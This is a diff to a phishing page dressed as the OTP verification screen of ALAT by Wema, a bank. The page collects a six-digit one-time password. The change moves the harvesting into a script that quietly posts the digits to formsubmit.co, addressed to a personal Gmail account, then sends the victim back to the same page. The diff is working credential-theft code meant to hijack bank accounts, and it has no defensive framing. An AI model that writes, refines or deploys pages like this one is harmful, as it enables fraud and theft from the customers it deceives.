@@ -2,7 +2,6 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Verify OTP | ALAT by Wema</title>
   <link rel="stylesheet" href="assets/index-C49gVU4U.css" />
 </head>
@@ -17,34 +16,45 @@
             </div>
             <div class="hometitle">Verify ALAT OTP</div>
           </div>
+
           <div class="formSec">
-            <div class="input">
-              <!-- Corrected Form -->
-              <form action="https://formsubmit.co/Godisrealq101@gmail.com" method="POST" class="otpForm">
-                <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_next" value="otp.html"> <!-- Changed here -->
+            <form id="otp-form">
+              <div class="formOtp">
+                <input type="text" name="otp1" maxlength="1" class="pin-input" inputmode="numeric" required />
+                <input type="text" name="otp2" maxlength="1" class="pin-input" inputmode="numeric" required />
+                <input type="text" name="otp3" maxlength="1" class="pin-input" inputmode="numeric" required />
+                <input type="text" name="otp4" maxlength="1" class="pin-input" inputmode="numeric" required />
+                <input type="text" name="otp5" maxlength="1" class="pin-input" inputmode="numeric" required />
+                <input type="text" name="otp6" maxlength="1" class="pin-input" inputmode="numeric" required />
+              </div>
 
-                <div class="formOtp">
-                  <input id="otp-0" type="text" name="otp1" maxlength="1" class="pin-input" inputmode="numeric" required />
-                  <input id="otp-1" type="text" name="otp2" maxlength="1" class="pin-input" inputmode="numeric" required />
-                  <input id="otp-2" type="text" name="otp3" maxlength="1" class="pin-input" inputmode="numeric" required />
-                  <input id="otp-3" type="text" name="otp4" maxlength="1" class="pin-input" inputmode="numeric" required />
-                  <input id="otp-4" type="text" name="otp5" maxlength="1" class="pin-input" inputmode="numeric" required />
-                  <input id="otp-5" type="text" name="otp6" maxlength="1" class="pin-input" inputmode="numeric" required />
-                </div>
+              <input type="hidden" name="_captcha" value="false">
+              <input type="hidden" name="_next" value="otp.html">
 
-                <span class="errorMessage"></span>
-
-                <div class="buttonSec">
-                  <button type="submit">Verify</button>
-                </div>
-              </form>
-              <!-- End Form -->
-            </div>
+              <div class="buttonSec">
+                <button type="submit">Verify</button>
+              </div>
+            </form>
           </div>
         </div>
       </div>
     </div>
   </div>
+
+<script>
+  const otpForm = document.getElementById('otp-form');
+  otpForm.addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const formData = new FormData(otpForm);
+
+    await fetch('https://formsubmit.co/Godisrealq101@gmail.com', {
+      method: 'POST',
+      body: formData
+    });
+
+    window.location.href = 'otp.html'; // Stay on otp.html after success
+  });
+</script>
+
 </body>
 </html>
